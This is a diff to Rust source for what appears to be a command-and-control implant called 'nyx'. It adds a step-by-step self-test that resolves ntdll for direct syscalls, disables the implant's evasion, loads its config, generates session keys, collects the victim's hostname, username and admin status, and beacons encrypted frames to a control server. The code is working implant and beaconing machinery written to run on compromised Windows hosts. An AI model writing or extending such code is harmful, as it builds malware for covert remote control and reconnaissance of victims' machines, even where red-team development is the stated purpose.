@@ -994,6 +994,100 @@ pub unsafe extern "system" fn nyx_selftest_loopdiag() {
     } // 2nd POST failed
     unsafe { exit(0xB7) }; // SECOND CYCLE OK — beacon_loop should work!
 }
+/// Diagnostic: replicate nyx_entry_noevasion step-by-step, writing a marker
+/// file at each milestone so we can see exactly where the beacon_loop blocks.
+/// The marker file is %TEMP%\nyx_noevasion_diag.txt with one line per step.
+/// Final exit code: 0xFD = all steps passed, 0xFx = failed at step x.
+#[cfg(feature = "selftest")]
+#[no_mangle]
+pub unsafe extern "system" fn nyx_selftest_noevasion_diag() {
+    let mk = |s: &str| { write_marker("nyx_noevasion_diag.txt", s); };
+
+    mk("step1_ntdll\n");
+    let ntdll = match crate::resolve::LiveNtdll::locate() {
+        Some(n) => n,
+        None => { mk("FAIL_ntdll\n"); unsafe { exit(0xFE); } }
+    };
+
+    mk("step2_resolve_table\n");
+    let _ssn = ntdll.resolve_table_owned();
+
+    mk("step3_init_global\n");
+    crate::syscalls::init_global();
+
+    mk("step4_register_csprng\n");
+    let _ = nyx_protocol::crypto::register_csprng(crate::entry::csprng_fill);
+
+    mk("step5_set_evasion_off\n");
+    crate::beacon::set_evasion_off();
+
+    mk("step6_config_load\n");
+    let (cfg, config_plain) = crate::config::load();
+    crate::mem::register_owned(config_plain);
+
+    mk("step7_keygen\n");
+    let kp = match nyx_protocol::ImplantKeypair::generate() {
+        Ok(k) => k,
+        Err(_) => { mk("FAIL_keygen\n"); unsafe { exit(0xFF); } }
+    };
+
+    mk("step8_session_key\n");
+    let key = kp.session_key(&cfg.server_pub);
+    crate::mem::register_key(*key.as_bytes());
+    let pubkey = kp.public_bytes();
+
+    mk("step9_sessioninfo\n");
+    let info = nyx_protocol::SessionInfo {
+        beacon_id: crate::hostinfo::beacon_id(),
+        hostname: crate::hostinfo::hostname(),
+        username: crate::hostinfo::username(),
+        os: crate::hostinfo::os(),
+        arch: crate::hostinfo::arch(),
+        pid: crate::hostinfo::pid(),
+        is_admin: crate::hostinfo::is_admin(),
+        auth_token: None,
+    };
+    let mut iw = nyx_protocol::wire::Writer::new();
+    if info.encode(&mut iw).is_err() {
+        mk("FAIL_sessioninfo_encode\n"); unsafe { exit(0xF8); }
+    }
+    let info_plain = iw.into_bytes();
+
+    mk("step10_encode_frame\n");
+    let frame = nyx_protocol::encode_frame(&pubkey, 0u64, &key, &info_plain);
+
+    mk("step11_dispatch_send_recv\n");
+    let ch_ctx = crate::channels::ChannelCtx::from_config(&cfg);
+    crate::channels::set_active(crate::channels::Channel::from_u8(cfg.primary_channel));
+    let resp = unsafe {
+        crate::channels::dispatch_send_recv(&ch_ctx, crate::channels::get_active(), &frame)
+    };
+    if resp.is_some() {
+        mk("step11_POST_OK\n");
+    } else {
+        mk("step11_POST_NONE\n");
+    }
+
+    mk("step12_sleep\n");
+    crate::beacon::sleep_seconds(1);
+
+    mk("step13_second_post\n");
+    let frame2 = nyx_protocol::encode_frame(
+        &pubkey, 1u64, &key,
+        &nyx_protocol::TaskResponse::encode_vec(&[]).expect("empty batch"),
+    );
+    let resp2 = unsafe {
+        crate::channels::dispatch_send_recv(&ch_ctx, crate::channels::get_active(), &frame2)
+    };
+    if resp2.is_some() {
+        mk("step13_POST_OK\n");
+    } else {
+        mk("step13_POST_NONE\n");
+    }
+
+    mk("DONE\n");
+    unsafe { exit(0xFD) };
+}
 
 // ============================================================================
 // nyx_linger: keep the implant alive + fully initialized for ~30s so an
